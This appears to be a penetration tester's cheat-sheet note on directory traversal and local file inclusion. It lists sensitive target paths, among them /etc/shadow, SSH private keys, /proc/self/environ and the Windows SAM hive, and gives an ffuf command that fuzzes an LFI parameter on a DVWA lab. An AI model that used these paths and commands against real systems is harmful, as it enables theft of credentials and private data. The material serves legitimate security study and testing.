# Manual

## Directory Traversal

Navigating directories

### Linux

```
/etc/passwd
```

### Windows

```
/windows/win.ini
\\localhost\c$\windows\win.ini
```

## Local File Inclusion (LFI)

### General

#### Enumeration

- Check for disable_functions

```
phpinfo.php
```

### Linux

```
/etc/group
/etc/shadow
/home/<username>/.ssh/id_rsa
/root/.ssh/id_rsa
/etc/crontab
/home/<username>/.bash_history

/etc/os-release

/etc/hosts
/etc/resolv.conf
/proc/net/tcp
/proc/net/udp
/proc/net/arp
/proc/net/dev

/etc/ssh/sshd_config

/proc/self/cmdline
/proc/self/environ
/proc/self/stat
/proc/self/status
/proc/mounts
```

```
$ seq 1 100000 > pids.txt

$ ffuf -u "http://dvwa.local/dvwa/vulnerabilities/fi/?page=FUZZ" -b "PHPSESSID=<PHP_cookie_session_ID>;security=low" -c -w pids.txt -mc 200
```

### Windows

```
/WINDOWS/repair/sam
/WINDOWS/repair/system
```

---
## References

- [[Tactics && Techniques && Procedures (TTPs) Phases/F - Post Exploitation/Shell Is The Beginning/02 - Enumeration and Discovery/Linux/Log Files/Manual/Living off the Land|Log Files]]

- [Hacking Articles: Comprehensive Guide on Path Traversal](https://www.hackingarticles.in/comprehensive-guide-on-path-traversal/)

- [SecurityIdiots: Guide to LFI](https://securityidiots.com/Web-Pentest/LFI/guide-to-lfi.html)

- [BorderGate: Local File Inclusion (LFI) Attacks](https://www.bordergate.co.uk/local-file-inclusion-attacks/)